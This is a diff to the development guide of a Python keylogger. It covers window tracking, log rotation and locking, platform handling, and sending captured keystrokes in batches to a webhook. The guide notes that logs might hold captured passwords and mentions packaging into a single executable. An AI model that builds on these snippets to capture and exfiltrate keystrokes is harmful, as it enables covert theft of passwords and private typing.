 This was slow because on Windows, `win32gui.GetForegroundWindow()` + `win32process.GetWindowThreadProcessId()` + `psutil.Process()` takes ~5ms. At 100 keystrokes per second (fast typer), that's 500ms of CPU time per second, noticeable lag.
@@ -745,13 +787,14 @@ This was slow because on Windows, `win32gui.GetForegroundWindow()` + `win32proce
 ### After: Cached Window Tracking
 
 ```python
-# Good: Cache for 0.5 seconds (keylogger.py:352-362)
 def _update_active_window(self) -> None:
     if not self.config.enable_window_tracking:
         return
-    
+
     now = datetime.now()
-    if (now - self._last_window_check).total_seconds() >= 0.5:
+    elapsed = (now - self._last_window_check).total_seconds()
+
+    if elapsed >= self.config.window_check_interval:
         self._current_window = self.window_tracker.get_active_window()
         self._last_window_check = now
 ```
@@ -759,7 +802,7 @@ def _update_active_window(self) -> None:
 **What changed:**
 - Store `_current_window` as instance variable
 - Store `_last_window_check` timestamp
-- Only update if 0.5 seconds passed
+- Only update if `window_check_interval` seconds passed (default 0.5)
 
 **Benchmarks:**
 - Before: ~500ms CPU per second at 100 keystrokes/sec
@@ -775,16 +818,15 @@ Why 0.5 seconds? People don't switch windows faster than twice per second in nor
 Example test for LogManager:
 
 ```python
-# tests/test_keylogger.py:66-94
 def test_log_manager():
     with tempfile.TemporaryDirectory() as tmpdir:
         config = KeyloggerConfig(
             log_dir=Path(tmpdir),
-            max_log_size_mb=0.001  # 1KB for fast rotation
+            max_log_size_mb=0.001
         )
-        
+
         manager = LogManager(config)
-        
+
         for i in range(10):
             event = KeyEvent(
                 timestamp=datetime.now(),
@@ -793,7 +835,7 @@ def test_log_manager():
                 key_type=KeyType.CHAR
             )
             manager.write_event(event)
-        
+
         log_files = list(Path(tmpdir).glob("keylog_*.txt"))
         assert len(log_files) > 0
 ```
@@ -809,7 +851,7 @@ We set `max_log_size_mb=0.001` (1KB) so rotation happens quickly. Writing 10 eve
 ### Running Tests
 
 ```bash
-just test  # Runs all component tests
+just test
 ```
 
 If tests fail with `ImportError: No module named 'pynput'`, run `just setup` first to install dependencies.
@@ -823,11 +865,9 @@ Random crashes, corrupted log files, garbled text in logs
 
 **Cause:**
 ```python
-# The problematic code
 class LogManager:
     def write_event(self, event):
-        self.log_file.write(event.to_log_string() + "\n")
-        # No lock!
+        self._file.write(event.to_log_string() + "\n")
 ```
 
 Two threads write simultaneously:
@@ -837,10 +877,10 @@ Two threads write simultaneously:
 
 **Fix:**
 ```python
-# Correct approach (keylogger.py:184-189)
 def write_event(self, event: KeyEvent) -> None:
-    with self.lock:
-        self.logger.info(event.to_log_string())
+    with self._lock:
+        self._file.write(event.to_log_string() + '\n')
+        self._file.flush()
         self._check_rotation()
 ```
 
@@ -849,7 +889,7 @@ Corrupted logs make keystroke analysis impossible. You might capture the passwor
 
 ### Pitfall 2: Blocking the Event Loop
 
-**Problem:** 
+**Problem:**
 Long-running operations in `_on_press` cause dropped keystrokes
 
 **Symptom:**
@@ -857,10 +897,9 @@ Fast typing sometimes skips letters
 
 **Cause:**
 ```python
-# Bad: HTTP request in callback
 def _on_press(self, key):
     event = create_event(key)
-    requests.post(webhook_url, json=event.to_dict())  # Blocks for 200ms
+    requests.post(webhook_url, json=event.to_dict())
 ```
 
 If the user types "hello" quickly (5 keystrokes in 500ms), the first keystroke blocks for 200ms sending HTTP. The next keystroke comes in 100ms but the callback is still processing. pynput might drop it.
@@ -868,10 +907,9 @@ If the user types "hello" quickly (5 keystrokes in 500ms), the first keystroke b
 **Fix:**
 Buffer events and send asynchronously:
 ```python
-# Good: Add to buffer, send in batches
 def _on_press(self, key):
     event = create_event(key)
-    self.webhook.add_event(event)  # Fast, just appends to list
+    self.webhook.add_event(event)
 ```
 
 ### Pitfall 3: Not Handling Platform Differences
@@ -884,7 +922,6 @@ Code works on your development machine but crashes on different OS
 
 **Cause:**
 ```python
-# Bad: Assumes macOS
 from AppKit import NSWorkspace
 active_app = NSWorkspace.sharedWorkspace().activeApplication()
 ```
@@ -893,15 +930,13 @@ This crashes on Windows with `ImportError: No module named 'AppKit'`.
 
 **Fix:**
 ```python
-# Good: Platform detection (keylogger.py:35-54)
-if platform.system() == "Darwin":
+if platform.system() == DARWIN:
     try:
         from AppKit import NSWorkspace
     except ImportError:
         NSWorkspace = None
 
-# Later usage (keylogger.py:137-139):
-if system == "Darwin" and NSWorkspace:
+if system == DARWIN and NSWorkspace:
     return WindowTracker._get_macos_window()
 ```
 
@@ -910,10 +945,9 @@ if system == "Darwin" and NSWorkspace:
 ### Why LogManager is Separate from Keylogger
 
 ```python
-# Could have been:
 class Keylogger:
     def write_log(self, event):
-        # File I/O directly in Keylogger
+        ...
 ```
 
 We separate LogManager because:
@@ -977,11 +1011,9 @@ This bundles Python interpreter + dependencies into single .exe (Windows) or bin
 ### Local Development
 
 ```bash
-# Start in development mode
 python keylogger.py
 
-# Logs go to ~/.keylogger_logs/
-# Press F9 to pause/resume
+# Press the toggle key (default F9) to pause/resume
 # Ctrl+C to stop
 ```
 
